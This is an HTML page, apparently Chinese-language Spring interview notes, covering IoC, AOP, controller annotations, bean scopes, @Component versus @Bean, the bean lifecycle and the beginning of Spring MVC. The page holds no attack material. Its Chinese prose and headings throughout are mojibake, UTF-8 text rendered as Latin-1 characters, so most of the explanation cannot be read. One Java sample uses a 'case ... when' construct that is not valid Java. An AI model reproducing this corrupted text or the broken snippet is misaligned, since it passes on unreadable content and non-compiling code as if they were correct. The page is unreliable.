<h2 id="IOCå’ŒAOP"><a href="#IOCå’ŒAOP" class="headerlink" title="IOCå’ŒAOP"></a>IOCå’ŒAOP</h2><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><p>IoCï¼ˆInverse of Control:æ§åˆ¶åè½¬ï¼‰æ˜¯ä¸€ç§<strong>è®¾è®¡æ€æƒ³</strong>ï¼Œå°±æ˜¯ <strong>å°†åŸæœ¬åœ¨ç¨‹åºä¸­æ‰‹åŠ¨åˆ›å»ºå¯¹è±¡çš„æ§åˆ¶æƒï¼Œäº¤ç”±Springæ¡†æ¶æ¥ç®¡ç†ã€‚</strong> IoC åœ¨å…¶ä»–è¯­è¨€ä¸­ä¹Ÿæœ‰åº”ç”¨ï¼Œå¹¶é Spring ç‰¹æœ‰ã€‚ <strong>IoC å®¹å™¨æ˜¯ Spring ç”¨æ¥å®ç° IoC çš„è½½ä½“ï¼Œ IoC å®¹å™¨å®é™…ä¸Šå°±æ˜¯ä¸ªMapï¼ˆkeyï¼Œvalueï¼‰,Map ä¸­å­˜æ”¾çš„æ˜¯å„ç§å¯¹è±¡ã€‚</strong></p>
<p>å°†å¯¹è±¡ä¹‹é—´çš„ç›¸äº’ä¾èµ–å…³ç³»äº¤ç»™ IoC å®¹å™¨æ¥ç®¡ç†ï¼Œå¹¶ç”± IoC å®¹å™¨å®Œæˆå¯¹è±¡çš„æ³¨å…¥ã€‚è¿™æ ·å¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸Šç®€åŒ–åº”ç”¨çš„å¼€å‘ï¼ŒæŠŠåº”ç”¨ä»å¤æ‚çš„ä¾èµ–å…³ç³»ä¸­è§£æ”¾å‡ºæ¥ã€‚ <strong>IoC å®¹å™¨å°±åƒæ˜¯ä¸€ä¸ªå·¥å‚ä¸€æ ·ï¼Œå½“æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œåªéœ€è¦é…ç½®å¥½é…ç½®æ–‡ä»¶&#x2F;æ³¨è§£å³å¯ï¼Œå®Œå…¨ä¸ç”¨è€ƒè™‘å¯¹è±¡æ˜¯å¦‚ä½•è¢«åˆ›å»ºå‡ºæ¥çš„ã€‚</strong> åœ¨å®é™…é¡¹ç›®ä¸­ä¸€ä¸ª Service ç±»å¯èƒ½æœ‰å‡ ç™¾ç”šè‡³ä¸Šåƒä¸ªç±»ä½œä¸ºå®ƒçš„åº•å±‚ï¼Œå‡å¦‚æˆ‘ä»¬éœ€è¦å®ä¾‹åŒ–è¿™ä¸ª Serviceï¼Œä½ å¯èƒ½è¦æ¯æ¬¡éƒ½è¦ææ¸…è¿™ä¸ª Service æ‰€æœ‰åº•å±‚ç±»çš„æ„é€ å‡½æ•°ï¼Œè¿™å¯èƒ½ä¼šæŠŠäººé€¼ç–¯ã€‚å¦‚æœåˆ©ç”¨ IoC çš„è¯ï¼Œä½ åªéœ€è¦é…ç½®å¥½ï¼Œç„¶ååœ¨éœ€è¦çš„åœ°æ–¹å¼•ç”¨å°±è¡Œäº†ï¼Œè¿™å¤§å¤§å¢åŠ äº†é¡¹ç›®çš„å¯ç»´æŠ¤æ€§ä¸”é™ä½äº†å¼€å‘éš¾åº¦ã€‚</p>
<p>Spring æ—¶ä»£æˆ‘ä»¬ä¸€èˆ¬é€šè¿‡ XML æ–‡ä»¶æ¥é…ç½® Beanï¼Œåæ¥å¼€å‘äººå‘˜è§‰å¾— XML æ–‡ä»¶æ¥é…ç½®ä¸å¤ªå¥½ï¼Œäºæ˜¯ SpringBoot æ³¨è§£é…ç½®å°±æ…¢æ…¢å¼€å§‹æµè¡Œèµ·æ¥ã€‚</p>
<p>æ¨èé˜…è¯»ï¼š<a href="https://www.zhihu.com/question/23277575/answer/169698662">https://www.zhihu.com/question/23277575/answer/169698662</a></p>
<p><strong>Spring IoCçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142187.png" alt="Spring IoCçš„åˆå§‹åŒ–è¿‡ç¨‹"></p>
<p>IoCæºç é˜…è¯»</p>
<ul>
<li><a href="https://javadoop.com/post/spring-ioc">https://javadoop.com/post/spring-ioc</a></li>
</ul>
<h3 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h3><p>AOP(Aspect-Oriented Programming:é¢å‘åˆ‡é¢ç¼–ç¨‹)èƒ½å¤Ÿå°†é‚£äº›ä¸ä¸šåŠ¡æ— å…³ï¼Œ<strong>å´ä¸ºä¸šåŠ¡æ¨¡å—æ‰€å…±åŒè°ƒç”¨çš„é€»è¾‘æˆ–è´£ä»»ï¼ˆä¾‹å¦‚äº‹åŠ¡å¤„ç†ã€æ—¥å¿—ç®¡ç†ã€æƒé™æ§åˆ¶ç­‰ï¼‰å°è£…èµ·æ¥</strong>ï¼Œä¾¿äº<strong>å‡å°‘ç³»ç»Ÿçš„é‡å¤ä»£ç </strong>ï¼Œ<strong>é™ä½æ¨¡å—é—´çš„è€¦åˆåº¦</strong>ï¼Œå¹¶<strong>æœ‰åˆ©äºæœªæ¥çš„å¯æ‹“å±•æ€§å’Œå¯ç»´æŠ¤æ€§</strong>ã€‚</p>
<p><strong>Spring AOPå°±æ˜¯åŸºäºåŠ¨æ€ä»£ç†çš„</strong>ï¼Œå¦‚æœè¦ä»£ç†çš„å¯¹è±¡ï¼Œå®ç°äº†æŸä¸ªæ¥å£ï¼Œé‚£ä¹ˆSpring AOPä¼šä½¿ç”¨<strong>JDK Proxy</strong>ï¼Œå»åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œè€Œå¯¹äºæ²¡æœ‰å®ç°æ¥å£çš„å¯¹è±¡ï¼Œå°±æ— æ³•ä½¿ç”¨ JDK Proxy å»è¿›è¡Œä»£ç†äº†ï¼Œè¿™æ—¶å€™Spring AOPä¼šä½¿ç”¨<strong>Cglib</strong> ï¼Œè¿™æ—¶å€™Spring AOPä¼šä½¿ç”¨ <strong>Cglib</strong> ç”Ÿæˆä¸€ä¸ªè¢«ä»£ç†å¯¹è±¡çš„å­ç±»æ¥ä½œä¸ºä»£ç†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142188.jpg" alt="SpringAOPProcess"></p>
<p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ AspectJ ,Spring AOP å·²ç»é›†æˆäº†AspectJ ï¼ŒAspectJ åº”è¯¥ç®—çš„ä¸Šæ˜¯ Java ç”Ÿæ€ç³»ç»Ÿä¸­æœ€å®Œæ•´çš„ AOP æ¡†æ¶äº†ã€‚</p>
<p>ä½¿ç”¨ AOP ä¹‹åæˆ‘ä»¬å¯ä»¥æŠŠä¸€äº›é€šç”¨åŠŸèƒ½æŠ½è±¡å‡ºæ¥ï¼Œåœ¨éœ€è¦ç”¨åˆ°çš„åœ°æ–¹ç›´æ¥ä½¿ç”¨å³å¯ï¼Œè¿™æ ·å¤§å¤§ç®€åŒ–äº†ä»£ç é‡ã€‚æˆ‘ä»¬éœ€è¦å¢åŠ æ–°åŠŸèƒ½æ—¶ä¹Ÿæ–¹ä¾¿ï¼Œè¿™æ ·ä¹Ÿæé«˜äº†ç³»ç»Ÿæ‰©å±•æ€§ã€‚æ—¥å¿—åŠŸèƒ½ã€äº‹åŠ¡ç®¡ç†ç­‰ç­‰åœºæ™¯éƒ½ç”¨åˆ°äº† AOP ã€‚</p>
<h2 id="RestController-Controller"><a href="#RestController-Controller" class="headerlink" title="@RestController @Controller"></a>@RestController @Controller</h2><p>@Controller è¿”å›ä¸€ä¸ªé¡µé¢</p>
<p>å•ç‹¬ä½¿ç”¨ @Controller ä¸åŠ  @ResponseBodyçš„è¯ä¸€èˆ¬ä½¿ç”¨åœ¨è¦è¿”å›ä¸€ä¸ªè§†å›¾çš„æƒ…å†µï¼Œè¿™ç§æƒ…å†µå±äºæ¯”è¾ƒä¼ ç»Ÿçš„Spring MVC çš„åº”ç”¨ï¼Œå¯¹åº”äºå‰åç«¯ä¸åˆ†ç¦»çš„æƒ…å†µã€‚</p>
<p>@RestController è¿”å›JSON æˆ– XML å½¢å¼æ•°æ®</p>
<p>ä½†@RestControlleråªè¿”å›å¯¹è±¡ï¼Œå¯¹è±¡æ•°æ®ç›´æ¥ä»¥ JSON æˆ– XML å½¢å¼å†™å…¥ HTTP å“åº”(Response)ä¸­ï¼Œè¿™ç§æƒ…å†µå±äº RESTful WebæœåŠ¡ï¼Œè¿™ä¹Ÿæ˜¯ç›®å‰æ—¥å¸¸å¼€å‘æ‰€æ¥è§¦çš„æœ€å¸¸ç”¨çš„æƒ…å†µï¼ˆå‰åç«¯åˆ†ç¦»ï¼‰ã€‚</p>
<p>@Controller +@ResponseBody è¿”å›JSON æˆ– XML å½¢å¼æ•°æ®</p>
<p>å¦‚æœä½ éœ€è¦åœ¨Spring4ä¹‹å‰å¼€å‘ RESTful WebæœåŠ¡çš„è¯ï¼Œä½ éœ€è¦ä½¿ç”¨@Controller å¹¶ç»“åˆ@ResponseBodyæ³¨è§£ï¼Œä¹Ÿå°±æ˜¯è¯´@Controller +@ResponseBody&#x3D; @RestControllerï¼ˆSpring 4 ä¹‹åæ–°åŠ çš„æ³¨è§£ï¼‰ã€‚</p>
<blockquote>
<p><code>@ResponseBody</code> æ³¨è§£çš„ä½œç”¨æ˜¯å°† <code>Controller</code> çš„æ–¹æ³•è¿”å›çš„å¯¹è±¡é€šè¿‡é€‚å½“çš„è½¬æ¢å™¨è½¬æ¢ä¸ºæŒ‡å®šçš„æ ¼å¼ä¹‹åï¼Œå†™å…¥åˆ°HTTP å“åº”(Response)å¯¹è±¡çš„ body ä¸­ï¼Œé€šå¸¸ç”¨æ¥è¿”å› JSON æˆ–è€… XML æ•°æ®ï¼Œè¿”å› JSON æ•°æ®çš„æƒ…å†µæ¯”è¾ƒå¤šã€‚</p>
</blockquote>
<h2 id="Spring-bean"><a href="#Spring-bean" class="headerlink" title="Spring bean"></a>Spring bean</h2><h3 id="Springä¸­beançš„ä½œç”¨åŸŸæœ‰å“ªäº›"><a href="#Springä¸­beançš„ä½œç”¨åŸŸæœ‰å“ªäº›" class="headerlink" title="Springä¸­beançš„ä½œç”¨åŸŸæœ‰å“ªäº›?"></a>Springä¸­beançš„ä½œç”¨åŸŸæœ‰å“ªäº›?</h3><ul>
<li>singleton : å”¯ä¸€ bean å®ä¾‹ï¼ŒSpring ä¸­çš„ bean é»˜è®¤éƒ½æ˜¯å•ä¾‹çš„ã€‚</li>
<li>prototype : æ¯æ¬¡è¯·æ±‚éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ bean å®ä¾‹ã€‚</li>
<li>request : æ¯ä¸€æ¬¡HTTPè¯·æ±‚éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„beanï¼Œè¯¥beanä»…åœ¨å½“å‰HTTP requestå†…æœ‰æ•ˆã€‚</li>
<li>session : æ¯ä¸€æ¬¡HTTPè¯·æ±‚éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ beanï¼Œè¯¥beanä»…åœ¨å½“å‰ HTTP session å†…æœ‰æ•ˆã€‚</li>
<li>global-sessionï¼š å…¨å±€sessionä½œç”¨åŸŸï¼Œä»…ä»…åœ¨åŸºäºportletçš„webåº”ç”¨ä¸­æ‰æœ‰æ„ä¹‰ï¼ŒSpring5å·²ç»æ²¡æœ‰äº†ã€‚Portletæ˜¯èƒ½å¤Ÿç”Ÿæˆè¯­ä¹‰ä»£ç (ä¾‹å¦‚ï¼šHTML)ç‰‡æ®µçš„å°å‹Java Webæ’ä»¶ã€‚å®ƒä»¬åŸºäºportletå®¹å™¨ï¼Œå¯ä»¥åƒservletä¸€æ ·å¤„ç†HTTPè¯·æ±‚ã€‚ä½†æ˜¯ï¼Œä¸ servlet ä¸åŒï¼Œæ¯ä¸ª portlet éƒ½æœ‰ä¸åŒçš„ä¼šè¯</li>
</ul>
<h3 id="Springä¸­çš„å•ä¾‹beançš„çº¿ç¨‹å®‰å…¨é—®é¢˜äº†è§£å—"><a href="#Springä¸­çš„å•ä¾‹beançš„çº¿ç¨‹å®‰å…¨é—®é¢˜äº†è§£å—" class="headerlink" title="Springä¸­çš„å•ä¾‹beançš„çº¿ç¨‹å®‰å…¨é—®é¢˜äº†è§£å—?"></a>Springä¸­çš„å•ä¾‹beançš„çº¿ç¨‹å®‰å…¨é—®é¢˜äº†è§£å—?</h3><p>çš„ç¡®æ˜¯å­˜åœ¨å®‰å…¨é—®é¢˜çš„ã€‚å› ä¸ºï¼Œå½“å¤šä¸ªçº¿ç¨‹æ“ä½œåŒä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œå¯¹è¿™ä¸ªå¯¹è±¡çš„æˆå‘˜å˜é‡çš„å†™æ“ä½œä¼šå­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</p>
<p>ä½†æ˜¯ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„ <code>Controller</code>ã€<code>Service</code>ã€<code>Dao</code> è¿™äº› Bean æ˜¯æ— çŠ¶æ€çš„ã€‚æ— çŠ¶æ€çš„ Bean ä¸èƒ½ä¿å­˜æ•°æ®ï¼Œå› æ­¤æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</p>
<p>å¸¸è§çš„æœ‰ 2 ç§è§£å†³åŠæ³•ï¼š</p>
<ol>
<li>åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ª <code>ThreadLocal</code> æˆå‘˜å˜é‡ï¼Œå°†éœ€è¦çš„å¯å˜æˆå‘˜å˜é‡ä¿å­˜åœ¨ <code>ThreadLocal</code> ä¸­ï¼ˆæ¨èçš„ä¸€ç§æ–¹å¼ï¼‰ã€‚</li>
<li>æ”¹å˜ Bean çš„ä½œç”¨åŸŸä¸º â€œprototypeâ€ï¼šæ¯æ¬¡è¯·æ±‚éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ bean å®ä¾‹ï¼Œè‡ªç„¶ä¸ä¼šå­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</li>
</ol>
<h3 id="Component-å’Œ-Bean-çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Component-å’Œ-Bean-çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="@Component å’Œ @Bean çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"></a>@Component å’Œ @Bean çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h3><ol>
<li>ä½œç”¨å¯¹è±¡ä¸åŒ: <code>@Component</code> æ³¨è§£ä½œç”¨äºç±»ï¼Œè€Œ<code>@Bean</code>æ³¨è§£ä½œç”¨äºæ–¹æ³•ã€‚</li>
<li><code>@Component</code>é€šå¸¸æ˜¯é€šè¿‡ç±»è·¯å¾„æ‰«ææ¥è‡ªåŠ¨ä¾¦æµ‹ä»¥åŠè‡ªåŠ¨è£…é…åˆ°Springå®¹å™¨ä¸­ï¼ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>@ComponentScan</code> æ³¨è§£å®šä¹‰è¦æ‰«æçš„è·¯å¾„ä»ä¸­æ‰¾å‡ºæ ‡è¯†äº†éœ€è¦è£…é…çš„ç±»è‡ªåŠ¨è£…é…åˆ° Spring çš„ bean å®¹å™¨ä¸­ï¼‰ã€‚<code>@Bean</code> æ³¨è§£é€šå¸¸æ˜¯æˆ‘ä»¬åœ¨æ ‡æœ‰è¯¥æ³¨è§£çš„æ–¹æ³•ä¸­å®šä¹‰äº§ç”Ÿè¿™ä¸ª bean,<code>@Bean</code>å‘Šè¯‰äº†Springè¿™æ˜¯æŸä¸ªç±»çš„ç¤ºä¾‹ï¼Œå½“æˆ‘éœ€è¦ç”¨å®ƒçš„æ—¶å€™è¿˜ç»™æˆ‘ã€‚</li>
<li><code>@Bean</code> æ³¨è§£æ¯” <code>Component</code> æ³¨è§£çš„è‡ªå®šä¹‰æ€§æ›´å¼ºï¼Œè€Œä¸”å¾ˆå¤šåœ°æ–¹æˆ‘ä»¬åªèƒ½é€šè¿‡ <code>@Bean</code>æ³¨è§£æ¥æ³¨å†Œbeanã€‚æ¯”å¦‚å½“æˆ‘ä»¬å¼•ç”¨ç¬¬ä¸‰æ–¹åº“ä¸­çš„ç±»éœ€è¦è£…é…åˆ° <code>Spring</code>å®¹å™¨æ—¶ï¼Œåˆ™åªèƒ½é€šè¿‡ <code>@Bean</code>æ¥å®ç°ã€‚</li>
</ol>
<p><code>@Bean</code>æ³¨è§£ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> TransferService <span class="title function_">transferService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransferServiceImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç ç›¸å½“äºä¸‹é¢çš„ xml é…ç½®</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transferService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.acme.TransferServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢è¿™ä¸ªä¾‹å­æ˜¯é€šè¿‡ <code>@Component</code> æ— æ³•å®ç°çš„ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> OneService <span class="title function_">getService</span><span class="params">(status)</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> (status)  &#123;</span><br><span class="line">        when <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">serviceImpl1</span>();</span><br><span class="line">        when <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">serviceImpl2</span>();</span><br><span class="line">        when <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">serviceImpl3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å°†ä¸€ä¸ªç±»å£°æ˜ä¸ºSpringçš„-bean-çš„æ³¨è§£æœ‰å“ªäº›"><a href="#å°†ä¸€ä¸ªç±»å£°æ˜ä¸ºSpringçš„-bean-çš„æ³¨è§£æœ‰å“ªäº›" class="headerlink" title="å°†ä¸€ä¸ªç±»å£°æ˜ä¸ºSpringçš„ bean çš„æ³¨è§£æœ‰å“ªäº›?"></a>å°†ä¸€ä¸ªç±»å£°æ˜ä¸ºSpringçš„ bean çš„æ³¨è§£æœ‰å“ªäº›?</h3><p>æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ <code>@Autowired</code> æ³¨è§£è‡ªåŠ¨è£…é…beanï¼Œè¦æƒ³æŠŠç±»æ ‡è¯†æˆå¯ç”¨äº <code>@Autowired</code> æ³¨è§£è‡ªåŠ¨è£…é…çš„ bean çš„ç±»,é‡‡ç”¨ä»¥ä¸‹æ³¨è§£å¯å®ç°ï¼š</p>
<ul>
<li><code>@Component</code> ï¼šé€šç”¨çš„æ³¨è§£ï¼Œå¯æ ‡æ³¨ä»»æ„ç±»ä¸º <code>Spring</code> ç»„ä»¶ã€‚å¦‚æœä¸€ä¸ªBeanä¸çŸ¥é“å±äºå“ªä¸ªå±‚ï¼Œå¯ä»¥ä½¿ç”¨<code>@Component</code> æ³¨è§£æ ‡æ³¨ã€‚</li>
<li><code>@Repository</code> : å¯¹åº”æŒä¹…å±‚å³ Dao å±‚ï¼Œä¸»è¦ç”¨äºæ•°æ®åº“ç›¸å…³æ“ä½œã€‚</li>
<li><code>@Service</code> : å¯¹åº”æœåŠ¡å±‚ï¼Œä¸»è¦æ¶‰åŠä¸€äº›å¤æ‚çš„é€»è¾‘ï¼Œéœ€è¦ç”¨åˆ° Daoå±‚ã€‚</li>
<li><code>@Controller</code> : å¯¹åº” Spring MVC æ§åˆ¶å±‚ï¼Œä¸»è¦ç”¨äºæ¥å—ç”¨æˆ·è¯·æ±‚å¹¶è°ƒç”¨ Service å±‚è¿”å›æ•°æ®ç»™å‰ç«¯é¡µé¢ã€‚</li>
</ul>
<h3 id="Spring-ä¸­çš„-bean-ç”Ÿå‘½å‘¨æœŸ"><a href="#Spring-ä¸­çš„-bean-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Spring ä¸­çš„ bean ç”Ÿå‘½å‘¨æœŸ?"></a>Spring ä¸­çš„ bean ç”Ÿå‘½å‘¨æœŸ?</h3><p>è¿™éƒ¨åˆ†ç½‘ä¸Šæœ‰å¾ˆå¤šæ–‡ç« éƒ½è®²åˆ°äº†ï¼Œä¸‹é¢çš„å†…å®¹æ•´ç†è‡ªï¼š <del><a href="https://yemengying.com/2016/07/14/spring-bean-life-cycle/">https://yemengying.com/2016/07/14/spring-bean-life-cycle/</a></del> (åŸä½œè€…å¯èƒ½ä¸å†ç»´æŠ¤è¿™ä¸ªåšå®¢ï¼Œè¿æ¥æ— æ³•è®¿é—®ï¼Œå¯é€šè¿‡å…¶ Github ä»“åº“è®¿é—® <a href="https://github.com/giraffe0813/giraffe0813.github.io">https://github.com/giraffe0813/giraffe0813.github.io</a>) ï¼Œé™¤äº†è¿™ç¯‡æ–‡ç« ï¼Œå†æ¨èä¸€ç¯‡å¾ˆä¸é”™çš„æ–‡ç«  ï¼š<a href="https://www.cnblogs.com/zrtqsk/p/3735273.html">https://www.cnblogs.com/zrtqsk/p/3735273.html</a> ã€‚</p>
<ul>
<li>Bean å®¹å™¨æ‰¾åˆ°é…ç½®æ–‡ä»¶ä¸­ Spring Bean çš„å®šä¹‰ã€‚</li>
<li>Bean å®¹å™¨åˆ©ç”¨ Java Reflection API åˆ›å»ºä¸€ä¸ªBeançš„å®ä¾‹ã€‚</li>
<li>å¦‚æœæ¶‰åŠåˆ°ä¸€äº›å±æ€§å€¼ åˆ©ç”¨ <code>set()</code>æ–¹æ³•è®¾ç½®ä¸€äº›å±æ€§å€¼ã€‚</li>
<li>å¦‚æœ Bean å®ç°äº† <code>BeanNameAware</code> æ¥å£ï¼Œè°ƒç”¨ <code>setBeanName()</code>æ–¹æ³•ï¼Œä¼ å…¥Beançš„åå­—ã€‚</li>
<li>å¦‚æœ Bean å®ç°äº† <code>BeanClassLoaderAware</code> æ¥å£ï¼Œè°ƒç”¨ <code>setBeanClassLoader()</code>æ–¹æ³•ï¼Œä¼ å…¥ <code>ClassLoader</code>å¯¹è±¡çš„å®ä¾‹ã€‚</li>
<li>ä¸ä¸Šé¢çš„ç±»ä¼¼ï¼Œå¦‚æœå®ç°äº†å…¶ä»– <code>*.Aware</code>æ¥å£ï¼Œå°±è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ã€‚</li>
<li>å¦‚æœæœ‰å’ŒåŠ è½½è¿™ä¸ª Bean çš„ Spring å®¹å™¨ç›¸å…³çš„ <code>BeanPostProcessor</code> å¯¹è±¡ï¼Œæ‰§è¡Œ<code>postProcessBeforeInitialization()</code> æ–¹æ³•</li>
<li>å¦‚æœBeanå®ç°äº†<code>InitializingBean</code>æ¥å£ï¼Œæ‰§è¡Œ<code>afterPropertiesSet()</code>æ–¹æ³•ã€‚</li>
<li>å¦‚æœ Bean åœ¨é…ç½®æ–‡ä»¶ä¸­çš„å®šä¹‰åŒ…å« init-method å±æ€§ï¼Œæ‰§è¡ŒæŒ‡å®šçš„æ–¹æ³•ã€‚ </li>
<li>å¦‚æœæœ‰å’ŒåŠ è½½è¿™ä¸ª Beançš„ Spring å®¹å™¨ç›¸å…³çš„ <code>BeanPostProcessor</code> å¯¹è±¡ï¼Œæ‰§è¡Œ<code>postProcessAfterInitialization()</code> æ–¹æ³•</li>
<li>å½“è¦é”€æ¯ Bean çš„æ—¶å€™ï¼Œå¦‚æœ Bean å®ç°äº† <code>DisposableBean</code> æ¥å£ï¼Œæ‰§è¡Œ <code>destroy()</code>æ–¹æ³•ã€‚</li>
<li>å½“è¦é”€æ¯ Bean çš„æ—¶å€™ï¼Œå¦‚æœ Bean åœ¨é…ç½®æ–‡ä»¶ä¸­çš„å®šä¹‰åŒ…å« destroy-method å±æ€§ï¼Œæ‰§è¡ŒæŒ‡å®šçš„æ–¹æ³•ã€‚</li>
</ul>
<p>å›¾ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142189.jpg" alt="Spring Bean ç”Ÿå‘½å‘¨æœŸ"></p>
<p>ä¸ä¹‹æ¯”è¾ƒç±»ä¼¼çš„ä¸­æ–‡ç‰ˆæœ¬:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142190.jpg" alt="Spring Bean ç”Ÿå‘½å‘¨æœŸ"></p>
<h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><h3 id="è¯´è¯´è‡ªå·±å¯¹äº-Spring-MVC-äº†è§£"><a href="#è¯´è¯´è‡ªå·±å¯¹äº-Spring-MVC-äº†è§£" class="headerlink" title="è¯´è¯´è‡ªå·±å¯¹äº Spring MVC äº†è§£?"></a>è¯´è¯´è‡ªå·±å¯¹äº Spring MVC äº†è§£?</h3><p>è°ˆåˆ°è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¸å¾—ä¸ææä¹‹å‰ Model1 å’Œ Model2 è¿™ä¸¤ä¸ªæ²¡æœ‰ Spring MVC çš„æ—¶ä»£ã€‚</p>
<ul>
<li><strong>Model1 æ—¶ä»£</strong> : å¾ˆå¤šå­¦ Java åç«¯æ¯”è¾ƒæ™šçš„æœ‹å‹å¯èƒ½å¹¶æ²¡æœ‰æ¥è§¦è¿‡ Model1 æ¨¡å¼ä¸‹çš„ JavaWeb åº”ç”¨å¼€å‘ã€‚åœ¨ Model1 æ¨¡å¼ä¸‹ï¼Œæ•´ä¸ª Web åº”ç”¨å‡ ä¹å…¨éƒ¨ç”¨ JSP é¡µé¢ç»„æˆï¼Œåªç”¨å°‘é‡çš„ JavaBean æ¥å¤„ç†æ•°æ®åº“è¿æ¥ã€è®¿é—®ç­‰æ“ä½œã€‚è¿™ä¸ªæ¨¡å¼ä¸‹ JSP æ—¢æ˜¯æ§åˆ¶å±‚åˆæ˜¯è¡¨ç°å±‚ã€‚æ˜¾è€Œæ˜“è§ï¼Œè¿™ç§æ¨¡å¼å­˜åœ¨å¾ˆå¤šé—®é¢˜ã€‚æ¯”å¦‚â‘ å°†æ§åˆ¶é€»è¾‘å’Œè¡¨ç°é€»è¾‘æ··æ‚åœ¨ä¸€èµ·ï¼Œå¯¼è‡´ä»£ç é‡ç”¨ç‡æä½ï¼›â‘¡å‰ç«¯å’Œåç«¯ç›¸äº’ä¾èµ–ï¼Œéš¾ä»¥è¿›è¡Œæµ‹è¯•å¹¶ä¸”å¼€å‘æ•ˆç‡æä½ï¼›</li>
<li><strong>Model2 æ—¶ä»£</strong> ï¼šå­¦è¿‡ Servlet å¹¶åšè¿‡ç›¸å…³ Demo çš„æœ‹å‹åº”è¯¥äº†è§£â€œJava Bean(Model)+ JSPï¼ˆView,ï¼‰+Servletï¼ˆControllerï¼‰ â€è¿™ç§å¼€å‘æ¨¡å¼,è¿™å°±æ˜¯æ—©æœŸçš„ JavaWeb MVC å¼€å‘æ¨¡å¼ã€‚Model:ç³»ç»Ÿæ¶‰åŠçš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ dao å’Œ beanã€‚Viewï¼šå±•ç¤ºæ¨¡å‹ä¸­çš„æ•°æ®ï¼Œåªæ˜¯ç”¨æ¥å±•ç¤ºã€‚Controllerï¼šå¤„ç†ç”¨æˆ·è¯·æ±‚éƒ½å‘é€ç»™ ï¼Œè¿”å›æ•°æ®ç»™ JSP å¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚</li>
</ul>
